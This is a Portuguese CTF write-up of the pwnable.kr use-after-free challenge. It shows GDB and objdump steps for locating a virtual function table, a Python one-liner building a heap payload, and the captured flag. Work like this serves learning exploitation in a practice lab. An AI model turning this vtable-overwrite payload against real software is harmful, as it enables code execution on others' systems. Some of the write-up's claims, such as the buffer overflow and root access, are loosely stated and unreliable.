# DuckWare Team - Use After Free (pwnable.kr)
###### Solved by @João Pedro Piceli and @xpics:) 

> Este CTF aborda exploração de vulnerabilidades em heap, especificamente **Use After Free (UAF)**.

---

## 🎯 Desafio: Explorando UAF para obter shell  

### 🔹 Introdução  
O desafio envolve um programa que gerencia objetos dinamicamente e permite liberar e reutilizar a memória. Nosso objetivo é explorar um **Use After Free** para redirecionar a execução do código e ganhar um shell.

### 🔹 Acesso ao Desafio  
```sh
ssh uaf@pwnable.kr -p2222  # (Senha: guest)
```

---

## 📂 Analisando os Arquivos  

Ao conectar via SSH, temos acesso a três arquivos:

![tela-inicial.png](https://i.postimg.cc/HWQtqhDP/tela-inicial.png)

- **flag** → Arquivo protegido sem permissão de acesso.
- **uaf** → Executável do desafio.
- **uaf.cpp** → Código-fonte em C++.

Ao analisar o arquivo `uaf.cpp`, encontramos a seguinte função suspeita que pode conceder permissão de administrador:

![funcao-que-da-acesso-de-adm.png](https://i.postimg.cc/Dy08rSgd/funcao-que-da-acesso-de-adm.png)

Também identificamos que o programa é vulnerável a um ataque de **Buffer Overflow**.

---

## 🛠 Análise da Memória e Identificação do Payload

### 🔹 Encontrando a Função `main`
Executamos o comando para obter a localização da `main` na memória:
```sh
objdump -d uaf | grep '<main>'
```

Resultado:

![main.png](https://i.postimg.cc/85yTcbq8/main.png)

### 🔹 Depuração com GDB
Iniciamos o **GDB** para depurar o executável:
```sh
gdb ./uaf
```

Definimos um **breakpoint** na função `main`:
```sh
(gdb) break main
```

![primeiro-break-point.png](https://i.postimg.cc/k5Q4JKJ9/primeiro-break-point.png)

Ativamos a visualização em **Assembly**:
```sh
(gdb) set disassembly-flavor intel
(gdb) layout asm
```

Isso nos permite visualizar o código em Assembly e os endereços de memória:

![Acessar-o-assembly.png](https://i.postimg.cc/qqy0wdNr/Acessar-o-assembly.png)

Localizamos o trecho crítico de memória:

![memoria-utilizada.png](https://i.postimg.cc/QNkyQttt/memoria-utilizada.png)

Aprofundando mais, encontramos a parte que executa `cmp; je; je; m->introduce()` e a função **VFT (Virtual Function Table)**.

![imagem-2025-03-07-124529211.png](https://i.postimg.cc/jqFJk6Ck/imagem-2025-03-07-124529211.png)

Definimos um segundo **breakpoint** para capturar o VFT:

![marcando-segundo-break-point.png](https://i.postimg.cc/Vkcv3Kw4/marcando-segundo-break-point.png)

Executamos o programa e obtemos o VFT:

![memoria-para-criar-o-payload.png](https://i.postimg.cc/t7GRG4K7/memoria-para-criar-o-payload.png)

---

## 🚀 Criando e Executando o Payload

Agora criamos nosso **payload**, lembrando de inverter a ordem dos bytes:
```sh
python -c "print '\x68\x15\x40\x00\x00\x00\x00\x00' + 'A'*16" > /tmp/heap_payload
```

![criando-o-arquivo-do-payload.png](https://i.postimg.cc/SxrCSnmB/criando-o-arquivo-do-payload.png)

Executamos o payload:
```sh
./uaf < /tmp/heap_payload
```

![conseguindo-acesso.png](https://i.postimg.cc/J0ZH9nTd/conseguindo-acesso.png)

Executando os comandos na ordem `3 → 2 → 2 → 1`, conseguimos **acesso root** e lemos a flag!

---

## 🏆 Flag Obtida!

![pegando-a-flag.png](https://i.postimg.cc/vmK1T9kN/pegando-a-flag.png)

```sh
flag: yay_flag_aft3r_pwning
